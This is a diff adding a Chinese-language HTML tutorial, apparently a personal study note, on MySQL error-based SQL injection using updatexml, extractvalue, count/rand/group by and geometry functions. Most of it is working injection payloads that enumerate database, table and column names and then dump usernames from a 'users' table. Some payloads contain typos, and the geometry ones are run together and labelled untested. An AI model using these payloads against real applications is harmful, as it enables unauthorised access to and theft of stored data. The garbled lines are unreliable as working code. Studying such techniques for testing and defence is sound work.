@@ -1,0 +1,68 @@
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><p>1、报错注入的分类</p>
+<p>MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，根据漏洞原因的不同，可以把MySQL报错注入分为以下几类：</p>
+<pre><code>· Biglnt等数据类型溢出
+
+· xpath语法错误
+
+· count()+rand()+group_by()导致主键重复
+
+· 空间数据类型函数错误
+</code></pre>
+<p>‍</p>
+<p><strong>xpath语法错误</strong></p>
+<p>从<strong>mysql5.1.5</strong>开始提供了两个<strong>XML</strong>查询和修改的函数:</p>
+<p>1.<strong>updatexml():</strong> 适用于5.5.5-5.5.49版本<br>2.extractvalue():适用于5.1.5+版本</p>
+<p>可以通过xml函数报错，来显示注入命令执行结果。</p>
+<p><strong>updatexml函数格式:</strong> updatexml((XML_document, XPath_string, new_value)</p>
+<p> <strong>·XML_document:</strong> xml文档的名称。</p>
+<p> <strong>·XPath_string:</strong> xpath格式的字符串</p>
+<p> <strong>·new_value:</strong> 替换查找到的符合条件的数据</p>
+<p><strong>extractvalue函数格式:</strong> extractvalue((XML document,XPath string)，除了没有第三个参数</p>
+<p>(new_value)，其它与updataxml()函数完全一样。所以后面只讲updatexml()函数的使用。</p>
+<p>简而言之，updatexml函数功能就是查找一个字符串，并进行替换。而我们在XPath</p>
+<p>string处也就是第二个参数那里传入不符合xpath格式的特殊字符，并加上一些查询语</p>
+<p>句，mysql就会把错误和查询语句的结果报错显示出来。这就是xpath报错注入的原理，</p>
+<p><strong>注意事项:</strong></p>
+<p>·必须是在<strong>XPath_string</strong>处传特殊字符，mysql才会报错，同时我们还需要注入命令，没这</p>
+<p>么多位置，所以要用到concat函数。</p>
+<p> <strong>·xpath</strong>只会对特殊字符进行报错，这里我们可以用16进制的0x7e(~)来进行利用。</p>
+<p>·<strong>xpath</strong>只会报错32个字符，对于输出结果大于32个字符的命令，要用substr函数截取后分</p>
+<p>段输出。</p>
+<p><strong>函数说明：</strong><br> <strong>·concat(s1,s2…sn):</strong> 将字符串s1,s2…sn合并为一个字符串。</p>
+<p>·<strong>substr(s,start,length):</strong> 从字符串s的 start 位置截取长度为 length 的子字符串，start从<strong>1</strong>开始。</p>
+<p>‍</p>
+<blockquote>
+<h3 id="报错注入流程"><a href="#报错注入流程" class="headerlink" title="报错注入流程"></a>报错注入流程</h3><p>1、寻找注入点		2、判断字符型还是数字型		3、判断闭合方式</p>
+<p><strong>4、使用updatexml查表</strong>  ?id&#x3D;1’ and updatexml(1,concat(0x7e,database(),0x7e),3) –+  <strong>(0x7e是~，为了使我们找出来的更好的分辨展示出来)为什么要加1和3是因为updatexml函数需要三个参数</strong></p>
+<p>系统执行的语句：SELECT * FROM users WHERE id&#x3D;’1’ and updatexml(1,concat(0x7e,database(),0x7e),3) – ‘ LIMIT 0,1</p>
+<p><strong>5、使用updatexml查找表名</strong></p>
+<p>?id’&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘security’),0x7e),3) –+</p>
+<p><strong>6、使用updatexmml查询列名</strong></p>
+<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; ‘security’ and table_name &#x3D; ‘users’),3) –+</p>
+<p><strong>7、查询具体数据</strong></p>
+<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),3) –+   <strong>（爆不出全部，因为xpath只会报错32个字符，对于输出结果大于32个字符的命令，要用substr函数截取后分段输出）</strong></p>
+<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),1,31),0x7e),3) –+   <strong>(substr也要三个参数，后面两个是爆的范围，group_concat和limit不能一起用)</strong></p>
+</blockquote>
+<h3 id="思考一下，为什么要这么构造攻击语句"><a href="#思考一下，为什么要这么构造攻击语句" class="headerlink" title="思考一下，为什么要这么构造攻击语句?"></a>思考一下，为什么要这么构造攻击语句?</h3><p>首先回到语法格式上:updatexml((XML_document,XPath_string,new_value)，我们必须在XPath_string这个参数里填充xpath格式的字符串，但是如果我们填充一个不是xpath格式的字符串，就会产生报错，所以语句就变成了updatexml(1,database(),1)，前后两个1是随便填充的内容目的是满足三个参数。<br>但是由于xpath只会对<strong>特殊字符</strong>进行报错（还有其他字符也可以实现），这里我们可以用~，16进制的0x7e来进行利用，所以就变成了updatexml(1,0x7edataase()0x7e,1)，但是由于数据库无法认识中间的内容，所以就无法成功执行，所以可以用concat()函数把多个字符串合并成一个，就变成了updatexml(1,concat(0x7e,database(),0x7e),1)</p>
+<p>‍</p>
+<p>思考:为什么中间的查询语句外面要括号括起来?</p>
+<p>因为concat()，中间<strong>不允许有空格</strong>，所以需要括号括起来把变成一个整体。<br><strong>concat()</strong> 函数无法将多行合并为一行，所以可以先用group_conat()函数将多行合并为一行。</p>
+<p>‍</p>
+<p>‍</p>
+<p>报错注入主要是利用updatexml()函数，其它方法偶尔会用到，这里集中介绍。<br>rend()+group()+count():虚拟表报错</p>
+<p>获取数据库名<br>select 1 from(select</p>
+<p>count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)<em>2))x from information_schema.tables group by x)a;	#concat()的第二个参数是查询的命令，这里是database()获取表名<br>select 1 from(select count(</em>),concat((select (select (select concat(0x7e,table_name,0x7e))) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)<em>2))x from information_schema.tables group by x)a;<br>获取列名<br>select 1from(select count(</em>),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 0,1),floor(rand(0)*2))x  from information_schema.tables group by x)a;</p>
+<p>获取数据<br>select 1 from(select count(*),concat((select (select (select concat(0x7e,first_name,0x7e)))from users limit0,1),floor(rand(0)*2))x from information_schema.tables group by x)a;</p>
+<p>或者使用下面的payload：</p>
+<p>获取数据库名<br>select count(*),concat((select database()),0x7e,floor(rand(0)*2))as a from information_schema.tables group by a;</p>
+<p>获取表名<br>select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e,floor(rand(0)*2))as a from information_schema.tables group by a;</p>
+<p>获取列名<br>select count(*),concat((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’limit 0,1),0x7e,floor(rand(0)*2))as a  from information_schema.tables group by a;</p>
+<p>获取数据<br>select count(*),concat((select first name from users limit 0,1),0x7e,floor(rand(0)*2)) as a from information_schema.tables group by a;</p>
+<p>（rand：生成0~1的随机数 floor向下取整）</p>
+<p>select count(*),concat((select database()),0x7e,floor(rand(0)*2)) as a from information_schema.tables group by a;（会有一个虚拟的表group，因为floor是向下取整的，只会随机出来0或者1的值所以当键值插入相同的时候就会键值冲突，冲突就会报错出来）</p>
+<p>‍</p>
+<blockquote>
+<p> <strong>·几何函数:以下payload未测试</strong><br>GeometryCollection: id&#x3D;1 AND GeometryCollection((select * from(select * from(select user())a)b)polygon():id&#x3D;1 AND polygon((select * from(select *from(select user())a)b))multipoint():id&#x3D;l AND multipoint((select * from(select *from(select  user())a)b))multilinestring():id&#x3D;1 AND multilinestring((select *from(select * from(select user())a)b))linestring():id&#x3D;1 AND LINESTRING((select *from(select * from(select user())a)b))multipolygon():id&#x3D;1 AND multipolygon((select *from(selectfrom(select user())a)b))</p>
+<p>‍</p>
+<p><strong>name_const:</strong>  仅可用于获取数据库版本信息</p>
+</blockquote>
